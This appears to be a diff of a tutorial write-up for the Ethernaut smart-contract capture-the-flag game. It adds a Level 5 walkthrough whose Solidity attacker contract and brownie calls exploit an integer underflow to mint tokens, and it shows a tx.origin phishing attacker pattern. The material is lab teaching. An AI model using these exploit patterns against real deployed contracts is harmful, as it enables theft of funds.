@@ -57,7 +57,7 @@ The require statment in the fallback function checks that our transaction has a 
 eth_amount = Web3.toWei("0.00001", "ether")
 fallback.contribute({"from": account, "value": eth_amount}) 
 ```
-Once we have called contribute we are now ready to trigger the fallback function. To do this we will execute a simple ether transfer to the contract. We can do this very easily with brownie:
+Once we have called contribute we are now ready to trigger the fallback function. To do this we will execute a simple ether transfer to the contract. We can do this very easily with brownie's built in transfer method for accounts:
 ```
 account.transfer(fallback, "0.00001 ether")
 ```
@@ -209,6 +209,7 @@ print(Telephone.owner() == account.address)
 ```
 We have successfully passed the level! 
 Moral of the story: Understand the differences between `ms.sender` and `tx.origin`. If you use `tx.origin` as an authorization check instead of `msg.sender`, your contract may fall victim to a phising-style attack. Here is a simple example of how this type of attack can occur:
+
 Suppose there is a victim contract
 ```solidity
 contract Victim {
@@ -224,7 +225,8 @@ contract Victim {
     }
 }
 ```
-This contract allows the owner to withdraw funds from the contract. However, since the require statement checks the value of owner against `tx.origin`, this function is susceptible to a phising attack. 
+This contract allows the owner to withdraw funds from the contract. However, since the require statement checks the value of owner against `tx.origin`, this function is susceptible to a phising attack.
+
 Consider an attacker contract
 ```solidity
 interface IVictim {
@@ -247,3 +249,53 @@ This contract has a fallback function that will call the withdraw function of th
 victim's account - ether - > attacker's contract - withdraw - > victim's contract
 ```
 The withdraw function will look at the `tx.origin` of the transaction, which is the victim's account (owner), and the require statement will pass. Then all the ether in the victim's contract will be sent to `msg.sender`, which in this case is the attacker's contract. 
+
+## Level 5: Token
+ To beat this level we need to hack the token contract and steal some extra tokens. This contract only has one function that transfers tokens and that function is aptly called `transfer`. 
+ ```solidity
+ function transfer(address _to, uint _value) public returns (bool) {
+    require(balances[msg.sender] - _value >= 0);
+    balances[msg.sender] -= _value;
+    balances[_to] += _value;
+    return true;
+  }
+ ```
+ The issue with this function is with the require statement. It verifies that the balance of `msg.sender` will not be less than 0 after subtracted by `value`. This require statement doesn't actually achieve anything. This check will always return true because uint (unsigned integers) can not be negative numbers. So, how can be we exploit this check? We can take advantage of this useless require statement and cause an integer underflow. To illustrate this exploit simply, we will create a custom contract to act as our accomplice.
+ ```solidity
+interface IToken {
+    function transfer(address _to, uint256 _value) external returns (bool);
+
+    function balanceOf(address _owner) external view returns (uint256 balance);
+}
+
+contract TokenAttacker {
+    IToken public instance;
+
+    constructor(address _instance) public {
+        instance = IToken(_instance);
+    }
+
+    function attack(address _to, uint256 _value) external {
+        instance.transfer(_to, _value);
+    }
+}
+ ``` 
+ Our accomplice has an `attack` function that simply calls the `tranfer` function in the Token contract. Why are we using a custom contract to call `transfer`? Having created this contract, it has a value of 0 tokens in the Token contract. We can pass any value greater than 0 to the `attack` function and this will result in the balance of our accomplice (0) being subtracted by that value (e.g 1). This will result in an integer underflow in this line of the Token contract:
+ ```solidity
+ balances[msg.sender] -= _value;
+ ```
+ uint256 0 - uint256 1 is equal to the max value for uint256 (2^256 - 1), which is a very big number. Great! We just gave our accomplice a huge amount of tokens. We can now choose to transfer as much of those tokens to our account as we want. We can do this by simply calling `attack` again with our account and desired token amount as agruments.
+ ```python
+ TokenAttacker.attack(account.address, *BIG NUMBER*)
+ ```
+However, its worth noting that this step is actually optional. We already solved this challenge when we called `attack` and passed in the value of 1. 
+```python
+TokenAttack.attack(account.address, 1)
+```
+Like we saw above, this will result in our accomplice receiving a huge amount of tokens. This will also transfer 1 token to our account, which will make our account's balance 21 tokens. We can take this even further and call the attack function with 1000000 as an agrument. This will pass the require statement and will give us a total balance of 1000020 tokens. You basically have the power to transfer as many tokens to yourself as you'd like. After you transfer your desired amount of tokens, you can check that your balance is now greater than 20:
+```python
+print(Token.balanceOf(account.address) > 20)
+```
+You have successfully passed the level! 
+Moral of the story: Uints have the potential to overflow or underflow. It is a best practice to use Openzeppelin's SafeMath library to handle your Uint data types. 
+**Note that starting from solidity version 0.8.0, integer overflows and underflows revert by default.** 
